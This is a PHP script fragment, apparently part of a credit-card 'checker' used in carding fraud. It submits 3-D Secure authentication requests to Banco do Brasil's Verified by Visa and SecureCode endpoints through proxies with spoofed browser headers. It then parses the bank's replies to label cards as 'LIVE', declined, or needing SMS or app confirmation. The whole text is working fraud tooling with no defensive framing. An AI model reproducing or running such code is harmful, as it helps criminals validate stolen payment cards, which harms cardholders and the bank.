<?php
if ($cc[0] == 4) {
    $vbvmsc        = 'VBV';
    $host          = 'www58.bb.com.br';
    $auth          = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/auth.bb';
    $inicio        = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/inicio.bb';
    $customer      = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/customer.bb';
    $r_customer    = 'https://www58.bb.com.br/ThreeDSecureAuth/gcs/statics/gas/validacao.bb?urlRetorno=/ThreeDSecureAuth/vbvLogin/customer.bb';    
}else {
    $vbvmsc        = 'MSC';
    $host          = 'www66.bb.com.br';
    $auth          = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/auth.bb';
    $inicio        = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/inicio.bb';
    $customer      = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/customer.bb';
    $r_customer    = 'https://www66.bb.com.br/SecureCodeAuth/gcs/statics/gas/validacao.bb?urlRetorno=/SecureCodeAuth/scdLogin/customer.bb';    
}
if (!$what_3ds){
    $end_time = microtime(true);
    $execution_time = intval($end_time - $start_time); 
    exit("LIVE;Aprovada ($execution_time"."s)");
}
// curl_setopt_array($ch, array(
//     CURLOPT_URL => $url,
//     CURLOPT_SSL_VERIFYPEER => false,
//     CURLOPT_RETURNTRANSFER => true,
//     CURLOPT_FOLLOWLOCATION => true,
//     CURLOPT_POST => False,
//     CURLOPT_POSTFIELDS => $post,
//     CURLOPT_PROXY => $proxy,
//     CURLOPT_ENCODING => '',
//     CURLOPT_COOKIESESSION => 1,
// ));
// $result = curl_exec($ch);

// AUTH
curl_setopt_array($ch, array(
    CURLOPT_URL => $auth,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_PROXY => $proxy,
    CURLOPT_COOKIEJAR => getcwd().'/cookies/'.$cid.'.txt',
    CURLOPT_COOKIEFILE => getcwd().'/cookies/'.$cid.'.txt',
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => 'PaReq='.urlencode($PaReq).'&TermUrl='.urlencode($TermUrl).'&MD='.urlencode($TermUrl).'',
    CURLOPT_HTTPHEADER => array(
        'Host: '.$host.'',      
        'Content-Type: application/x-www-form-urlencoded',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,id;q=0.6,es;q=0.5'    
    ),
));
$Auth = curl_exec($ch);

// INICIO
curl_setopt_array($ch, array(
    CURLOPT_URL => $inicio,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_PROXY => $proxy,
    CURLOPT_COOKIEJAR => getcwd().'/cookies/'.$cid.'.txt',
    CURLOPT_COOKIEFILE => getcwd().'/cookies/'.$cid.'.txt',
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => 'TermUrl='.urlencode($TermUrl).'&PaReq='.urlencode($PaReq).'&MD='.urlencode($TermUrl).'',
    CURLOPT_HTTPHEADER => array(
        'Host: '.$host.'',
        'Origin: https://'.$host.'',
        'Content-Type: application/x-www-form-urlencoded',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer: '.$auth.'',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,id;q=0.6,es;q=0.5'    
    ),
));
$Inicio = curl_exec($ch);
$end_time = microtime(true);
$execution_time = intval($end_time - $start_time); 

if (strpos($Inicio, 'Abra o aplicativo do BB em seu smartphone')) {
    @unlink(getcwd().'/cookies/'.$cid.'.txt');
    exit("LIVE;$vbvmsc - QRCODE".' ('.$execution_time.'s)');
}elseif (strpos($Inicio, 'PAR(55-108)')) {
    @unlink(getcwd().'/cookies/'.$cid.'.txt');
    exit('Validade incorreta'.' ('.$execution_time.'s)');
}elseif (strpos($Inicio, 'Ocorreu um erro durante o processamento de sua')) {
    @unlink(getcwd().'/cookies/'.$cid.'.txt');
    exit('Cartão recusado'.' ('.$execution_time.'s)');
}

// CUSTOMER
curl_setopt_array($ch, array(
    CURLOPT_URL => $customer,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_PROXY => $proxy,
    CURLOPT_COOKIEJAR => getcwd().'/cookies/'.$cid.'.txt',
    CURLOPT_COOKIEFILE => getcwd().'/cookies/'.$cid.'.txt',
    CURLOPT_HTTPHEADER => array(
        'Host: '.$host.'',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer: '.$r_customer.'',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,id;q=0.6,es;q=0.5'   
    ),
));
$Custumer = curl_exec($ch);
$end_time = microtime(true);
$execution_time = intval($end_time - $start_time); 
if (strpos($Custumer, 'Prezado cliente, voc&ecirc; n&atilde;o possui o M&oacute')) {
    @unlink(getcwd().'/cookies/'.$cid.'.txt');
    exit("LIVE;SEM $vbvmsc".' ('.$execution_time.'s)');
}elseif (strpos($Custumer, 'Selecione um celular para receber ')) {
    @unlink(getcwd().'/cookies/'.$cid.'.txt');
    exit("LIVE;$vbvmsc - SMS".' ('.$execution_time.'s)');
}else {
    @unlink(getcwd().'/cookies/'.$cid.'.txt');
    exit("Matriz/bin incorreta ou algo deu errado".' ('.$execution_time.'s)');
}